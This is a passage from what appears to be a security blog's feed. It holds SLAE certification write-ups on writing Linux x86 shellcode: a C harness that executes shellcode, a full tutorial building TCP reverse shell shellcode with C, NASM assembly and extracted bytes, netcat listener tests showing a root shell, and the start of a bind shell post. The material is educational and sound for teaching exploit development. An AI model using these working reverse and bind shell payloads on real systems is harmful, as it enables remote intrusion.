+&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xeb\x15\x5e\x6a\x0c\x59\x31\xc0\x66\xad\x88\x46\xff&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xc1\xe8\x08\x88\x46\xfe\xe2\xf3\xeb\x05\xe8\xe6\xff\xff\xff\xc0\x31\x68\x50\x2f&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6e\x68\x73\x2f\x68\x62\x2f\x89\x69\x31\xe3\x31\xc9\xb0\xd2\xcd\x0b\x90\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
+
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Shellcode length: %d&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;)();&lt;/span&gt;
+
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And that's how we build a binary out of it and run the result:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;gcc -fno-stack-protector -z execstack -o scframe scframe.c
+./scframe
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="Working encoded shellcode" src="http://unlim.xyz/images/assembly-custom-encoding-scheme/working-encoded-shellcode.png" title="Working encoded shellcode" /&gt;
+&lt;div class="img-caption"&gt;It works!&lt;/div&gt;&lt;/p&gt;
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;hr&gt;
+This blog post was created for completing the requirements of the &lt;a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification. Student id: SLAE-685.&lt;/p&gt;
+&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</summary><category term="exploit-development"></category><category term="slae"></category></entry><entry><title>Creating TCP reverse shell shellcode (SLAE, Assignment #2)</title><link href="http://unlim.xyz/blog/creating-tcp-reverse-shell-shellcode/" rel="alternate"></link><updated>2015-10-05T21:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:unlim.xyz,2015-10-05:blog/creating-tcp-reverse-shell-shellcode/</id><summary type="html">&lt;p&gt;I remember when I was first introduced to the concept of the reverse shell it was a bit difficult to wrap my mind around it. The reverse shell is called so because instead of attacker connecting to the victim machine, the victim machine initiates a connection to attacking machine. The shell-throwing direction is reversed in this case. Reverse shell's main purpose is to circumvent firewalls that blindly allow outgoing traffic without proper filtering. &lt;/p&gt;
+&lt;p&gt;It turned out that the code for the reverse shell is actually simpler than that of the &lt;a href="/blog/building-tcp-bind-shell-shellcode/"&gt;bind TCP shell&lt;/a&gt; I wrote about in a previous post. It is also shorter. &lt;/p&gt;
+&lt;p&gt;Here comes the prototype C program that we will base our Assembly code on. Code is pretty simple, but nevertheless I furnished it with comments:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include &amp;lt;strings.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include &amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include &amp;lt;netinet/in.h&amp;gt;&lt;/span&gt;
+
+&lt;span class="cp"&gt;#define ADDR &amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;
+&lt;span class="cp"&gt;#define PORT 1234&lt;/span&gt;
+
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// Create socket for outgoing connection &lt;/span&gt;
+    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;conn_sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; 
+
+    &lt;span class="c1"&gt;// Populate server side connection information    &lt;/span&gt;
+    &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;sockaddr_in&lt;/span&gt; &lt;span class="n"&gt;serv_addr&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;serv_addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sin_family&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// IPv4&lt;/span&gt;
+    &lt;span class="n"&gt;serv_addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sin_addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;s_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;inet_addr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// IP address: localhost&lt;/span&gt;
+    &lt;span class="n"&gt;serv_addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sin_port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;htons&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  &lt;span class="c1"&gt;// Port # &lt;/span&gt;
+
+    &lt;span class="c1"&gt;// Initiate connection&lt;/span&gt;
+    &lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;conn_sock&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;sockaddr&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;serv_addr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// Forward process&amp;#39;s stdin, stdout and stderr to the incoming connection&lt;/span&gt;
+    &lt;span class="n"&gt;dup2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;conn_sock&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;dup2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;conn_sock&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;dup2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;conn_sock&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// Run shell&lt;/span&gt;
+    &lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After compilation we can use Netcat to test that the code is working:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Start Netcat in one console window&lt;/span&gt;
+nc -lvp 1234
+
+&lt;span class="c"&gt;# Compile and start the C reverse shell implementation&lt;/span&gt;
+gcc -o revshell revshell.c &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./revshell
+
+&lt;span class="c"&gt;# Back in the console with Netcat you should get a connection. Test if it works:&lt;/span&gt;
+listening on &lt;span class="o"&gt;[&lt;/span&gt;any&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;1234&lt;/span&gt; ...
+connect to &lt;span class="o"&gt;[&lt;/span&gt;127.0.0.1&lt;span class="o"&gt;]&lt;/span&gt; from localhost &lt;span class="o"&gt;[&lt;/span&gt;127.0.0.1&lt;span class="o"&gt;]&lt;/span&gt; 35476
+id
+&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
+^C
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;One thing to remember from the previous post on bind TCP shell is that &lt;code&gt;socket&lt;/code&gt; and &lt;code&gt;connect&lt;/code&gt; functions are plugged into the &lt;code&gt;socketcall&lt;/code&gt; system call. And basically we can largely reuse the bind shell source code making relevant changes to it. The changes include removing blocks for listen and accept functions, transforming bind function block to connect and replacing the address from 0.0.0.0 to 127.1.1.1. The 127.1.1.1 is equivalent to 127.0.0.1 localhost address, with an advantage of eliminating zeroes. Some people think that only 127.0.0.1 address refers to the localhost, while in truth all valid IPv4 address beginning with 127 are synonyms and refer to the same localhost address. &lt;/p&gt;
+&lt;p&gt;After applying the aforementioned changes here is what I got (follow the comments if it is not clear what's going on):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
+
+&lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="nl"&gt;addr:&lt;/span&gt; &lt;span class="nf"&gt;equ&lt;/span&gt; &lt;span class="mh"&gt;0x0101017F&lt;/span&gt; &lt;span class="c1"&gt;; = 127.1.1.1 in little endian notation&lt;/span&gt;
+    &lt;span class="nl"&gt;port:&lt;/span&gt; &lt;span class="nf"&gt;equ&lt;/span&gt; &lt;span class="mh"&gt;0xD204&lt;/span&gt; &lt;span class="c1"&gt;; = 1234 in little endian notation&lt;/span&gt;
+
+    &lt;span class="c1"&gt;; Reference: socketcall(int call, unsigned long *args)&lt;/span&gt;
+
+    &lt;span class="c1"&gt;; Create socket: EAX = socket(AF_INET, SOCK_STREAM, 0)&lt;/span&gt;
+    &lt;span class="c1"&gt;; On success EAX will contain socket file descriptor&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;  &lt;span class="c1"&gt;; zero out ebx&lt;/span&gt;
+    &lt;span class="nf"&gt;mul&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;       &lt;span class="c1"&gt;; implicitly zero out eax and edx &lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x66&lt;/span&gt;  &lt;span class="c1"&gt;; socketcall syscall #&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;bl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x1&lt;/span&gt;   &lt;span class="c1"&gt;; socket function #&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;      &lt;span class="c1"&gt;; 3rd arg to socket function&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mh"&gt;0x1&lt;/span&gt; &lt;span class="c1"&gt;; SOCK_STREEAM - 2nd arg to socket function&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mh"&gt;0x2&lt;/span&gt; &lt;span class="c1"&gt;; 1st arg: socket domain = 2 (AF_INET)&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;  &lt;span class="c1"&gt;; Copy args address to ECX &lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+
+    &lt;span class="c1"&gt;; Try establishing a connection to a remote host  &lt;/span&gt;
+    &lt;span class="c1"&gt;; EAX = connect(conn_sock, &amp;amp;sockaddr_in, sizeof(sockaddr_in))&lt;/span&gt;
+    &lt;span class="c1"&gt;; EAX will be 0 on success&lt;/span&gt;
+    &lt;span class="nf"&gt;xchg&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;  &lt;span class="c1"&gt;; Save socket fd to edx; eax is all 0s now&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x66&lt;/span&gt;   &lt;span class="c1"&gt;; socketcall syscall #&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;        &lt;span class="c1"&gt;; Reusing 1st arg of the prev func (2)&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;esi&lt;/span&gt;        &lt;span class="c1"&gt;; Trashing 4 bytes from the stack &lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;addr&lt;/span&gt;      &lt;span class="c1"&gt;; sockaddr_in.sin_addr.s_addr = 127.1.1.1 (4 bytes) &lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;word&lt;/span&gt; &lt;span class="nv"&gt;port&lt;/span&gt; &lt;span class="c1"&gt;; sockaddr_in.sin_port = 1234 (2 bytes)&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;word&lt;/span&gt; &lt;span class="nb"&gt;bx&lt;/span&gt;   &lt;span class="c1"&gt;; sin_family = 2 (AF_INET) (2 bytes)&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;   &lt;span class="c1"&gt;; addr_len = 16 (structure size) (we don&amp;#39;t care about last 8 bytes)&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;       &lt;span class="c1"&gt;; ECX points to right address, no need to set or change it&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;       &lt;span class="c1"&gt;; Socket fd &lt;/span&gt;
+                   &lt;span class="c1"&gt;; Stack is now 0x0000000 [0x00000000, 0xd204, 0x0002], &lt;/span&gt;
+                   &lt;span class="c1"&gt;; 0x00000010, &amp;amp;sockaddr_in, socketfd&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;   &lt;span class="c1"&gt;; Copy listening socket descriptor address to ECX &lt;/span&gt;
+    &lt;span class="nf"&gt;inc&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;        &lt;span class="c1"&gt;; connect func # (3)&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;               
+
+    &lt;span class="c1"&gt;; Redirect process&amp;#39;s stdin/out/err to the incoming socket   &lt;/span&gt;
+    &lt;span class="nf"&gt;xchg&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;  &lt;span class="c1"&gt;; 1st syscall arg in EBX = outgoing socket fd&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;cl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
+&lt;span class="nl"&gt;.next_fd:&lt;/span&gt;          &lt;span class="c1"&gt;; Redirect all process&amp;#39;s fds ot incoming socket fd&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x3f&lt;/span&gt;   &lt;span class="c1"&gt;; dup2 syscall #&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;        
+    &lt;span class="nf"&gt;dec&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;         
+    &lt;span class="nf"&gt;jns&lt;/span&gt; &lt;span class="nv"&gt;.next_fd&lt;/span&gt;   &lt;span class="c1"&gt;; loop until ECX == -1 &lt;/span&gt;
+
+    &lt;span class="c1"&gt;; Start the shell &lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;               &lt;span class="c1"&gt;; push some delimiting nulls&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="mh"&gt;0x68732f2f&lt;/span&gt;  &lt;span class="c1"&gt;; push /bin//sh string &lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="mh"&gt;0x6e69622f&lt;/span&gt;  
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;           &lt;span class="c1"&gt;; 1st syscall arg: program address&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;               &lt;span class="c1"&gt;; push delimiting nulls &lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;           &lt;span class="c1"&gt;; 3rd syscall arg: env vars  &lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;               &lt;span class="c1"&gt;; Push program address string creating args array&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;           &lt;span class="c1"&gt;; 2nd syscall arg: args&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xb&lt;/span&gt;            &lt;span class="c1"&gt;; execve syscall #&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now let's build the binary and extract and thest the shellcode to make sure that we did not miss anything. &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Build a binary and extract the shellcode &lt;/span&gt;
+nasm -f elf revshell.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -o revshell revshell.o
+scdump revshell
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Output of the above command (formatted to fit the screen):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;Length:  78
+Payload: &amp;quot;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80&amp;quot;
+&amp;quot;\x92\xb0\x66\x5b\x5e\x68\x7f\x01\x01\x01\x66\x68\x04\xd2\x66\x53\x6a\x10\x51&amp;quot;
+&amp;quot;\x52\x89\xe1\x43\xcd\x80\x87\xd3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9&amp;quot;
+&amp;quot;\x57\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x57\x89\xe2\x53\x89\xe1&amp;quot;
+&amp;quot;\xb0\x0b\xcd\x80&amp;quot;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Paste the shellcode into the scframe.c and compile it:&lt;/span&gt;
+gcc -fno-stack-protector -z execstack -o scframe scframe.c
+
+&lt;span class="c"&gt;# In another console window start Netcat listener&lt;/span&gt;
+nc -lvp 1234
+
+&lt;span class="c"&gt;# Back in the window where you compiled the scframe launch it&lt;/span&gt;
+./scframe
+
+&lt;span class="c"&gt;# Check the Netcat listener to see if you got a reverse shell connection&lt;/span&gt;
+nc -lvp 1234
+listening on &lt;span class="o"&gt;[&lt;/span&gt;any&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;1234&lt;/span&gt; ...
+connect to &lt;span class="o"&gt;[&lt;/span&gt;127.1.1.1&lt;span class="o"&gt;]&lt;/span&gt; from localhost &lt;span class="o"&gt;[&lt;/span&gt;127.0.0.1&lt;span class="o"&gt;]&lt;/span&gt; 33275
+id
+&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
+^C
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Everything seems to be working. Off we go to the next assignment of creating &lt;a href="/assembly-custom-encoding-scheme.html"&gt;a custom encoder&lt;/a&gt;!&lt;/p&gt;
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;hr&gt;
+This blog post was created for completing the requirements of the &lt;a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification. Student id: SLAE-685.&lt;/p&gt;
+&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</summary><category term="exploit-development"></category><category term="slae"></category></entry><entry><title>Building TCP bind shell shellcode (SLAE, Assignment #1)</title><link href="http://unlim.xyz/blog/building-tcp-bind-shell-shellcode/" rel="alternate"></link><updated>2015-10-05T18:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:unlim.xyz,2015-10-05:blog/building-tcp-bind-shell-shellcode/</id><summary type="html">&lt;p&gt;If you haven't written a bind TCP shell in Assembly before, than it is better to start with a higher-level language working prototype and then translate it to Assembly. The obvious choice of the higher level language for Linux is C. Here is a working TCP bind shell code in C. I tried to remove as many unneeded code as possible. Generally it may be a bad idea, but when writing shellcode this is exactly what you want - a working thing with as less parts as possible.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include &amp;lt;strings.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include &amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include &amp;lt;netinet/in.h&amp;gt;&lt;/span&gt;
+
+&lt;span class="cp"&gt;#define PORT 1234&lt;/span&gt;
+
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// Create a listening socket&lt;/span&gt;
+    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;listen_sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// Populate server side connection information    &lt;/span&gt;
